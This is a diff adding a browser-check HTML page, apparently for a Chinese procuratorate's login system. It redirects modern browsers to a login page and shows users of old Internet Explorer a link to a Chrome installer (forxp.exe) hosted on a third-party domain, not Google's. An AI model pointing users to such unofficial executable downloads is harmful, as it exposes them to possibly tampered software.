@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+
+<head>
+    <title>Check System</title>
+    <meta charset="utf-8">
+    <meta name="keywords" content="德兴市,人民检察院,检察院">
+    <meta name="description" content="this is my page">
+    <meta name="content-type" content="text/html; charset=UTF-8">
+    <script src="myjs/jquery-1.12.4.js"></script>
+    <style>
+        body{
+            background-image: url(http://www.dxsrmjcy.com.cn/pic/bg2.jpg);
+            background-size: cover;
+        }
+</style>
+</head>
+<script>
+    function getBrowerInfo() {
+        var Sys = {};
+        var ua = navigator.userAgent.toLowerCase();
+        var s;
+        (s = ua.match(/rv:([\d.]+)\) like gecko/)) ? Sys.ie = s[1] :
+            (s = ua.match(/msie ([\d.]+)/)) ? Sys.ie = s[1] :
+                (s = ua.match(/firefox\/([\d.]+)/)) ? Sys.firefox = s[1] :
+                    (s = ua.match(/chrome\/([\d.]+)/)) ? Sys.chrome = s[1] :
+                        (s = ua.match(/opera.([\d.]+)/)) ? Sys.opera = s[1] :
+                            (s = ua.match(/version\/([\d.]+).*safari/)) ? Sys.safari = s[1] : 0;
+
+        var BrowerInfo, BrowerVersion;
+        if (Sys.ie) {
+            BrowerInfo = 'IE';
+            BrowerVersion = Sys.ie
+        } else if (Sys.firefox) {
+            BrowerInfo = 'Firefox';
+            BrowerVersion = Sys.firefox
+        } else if (Sys.chrome) {
+            BrowerInfo = 'Chrome';
+            BrowerVersion = Sys.chrome
+        } else if (Sys.opera) {
+            BrowerInfo = 'Opera';
+            BrowerVersion = Sys.opera
+        } else if (Sys.safari) {
+            BrowerInfo = 'Safari';
+            BrowerVersion = Sys.safari
+        }
+        //判断ie的版本号，如果低于ie8，则进入简版，且不支持微信编辑
+        var temp = BrowerVersion.indexOf('.');
+        if (BrowerInfo == 'IE') {
+            var BrVersion = parseInt(BrowerVersion.substring(0, temp));
+            if (BrVersion < 8) {
+                $("#p1").html('<h1>当前浏览器为IE且版本号低于8</h1>');
+                $("#p2").html('<h1>如需使用完整版功能，请下载并安装使用chrome浏览器进行访问</h1>');
+                $("#p3").html('<a style="font-size:40px;" href="http://www.chrome.hk.cn/forxp.exe">点我下载chrome浏览器(xp版)</a>');
+            }
+            else{
+                window.location.href='/login.jsp';
+            }
+        }
+        else{
+            window.location.href='/login.jsp';
+        }
+        
+    }
+
+    function getSystemInfo() {
+        var isXP = true;
+        var agent = navigator.userAgent.toLowerCase();
+        var SystemInfo, CpuInfo;
+        if (agent.indexOf("windows nt 5.") > -1) {
+            SystemInfo = 'XP';
+        } else if (agent.indexOf("windows nt 6.0") > -1) {
+            SystemInfo = 'Vista';
+        } else if (agent.indexOf("windows nt 6.1") > -1) {
+            SystemInfo = 'Win7';
+        } else if (agent.indexOf("windows nt 6.2") > -1) {
+            SystemInfo = 'Win8';
+        } else if (agent.indexOf("windows nt 6.3") > -1) {
+            SystemInfo = 'Win8.1';
+        } else if (agent.indexOf("windows nt 10.") > -1) {
+            SystemInfo = 'Win10';
+        }
+
+        if (agent.indexOf("win64") >= 0 || agent.indexOf("wow64") >= 0) CpuInfo = 'x64';
+        else CpuInfo = ' X86';
+        return ("当前操作系统为" + SystemInfo + ' ' + CpuInfo);
+    }
+    $(document).ready(function () {
+        getBrowerInfo();
+    })
+
+</script>
+
+<body>
+    
+    <div id="infomation">
+        <h1 id="p1"></h1>
+        <h1 id="p2"></h1>
+        <h1 id="p3"></h1>
+        <h1 id="p4"></h1>
+        <h1 id="p5"></h1>
+        <h1 id="p1"></h1>
+        <h1 id="p1"></h1>
+        <h1 id="p1"></h1>
+    </div>
+    
+    <!--
+    <h1>当前浏览器为IE且版本号低于8</h1>
+    <h1>如需使用完整版功能，请下载并安装使用chrome浏览器进行访问</h1>
+    <a style="font-size:40px;" href="http://www.chrome.hk.cn/forxp.exe">点我下载chrome浏览器(xp版)</a>
+    <h1>如果不想下载，则点击如下按钮，进入精简版系统，此系统无法使用微信文章编辑器</h1>
+    <a style="font-size:40px;" href="http://www.chrome.hk.cn/forxp.exe">进入精简版系统</a>
+        -->
+</body>
+
+</html>
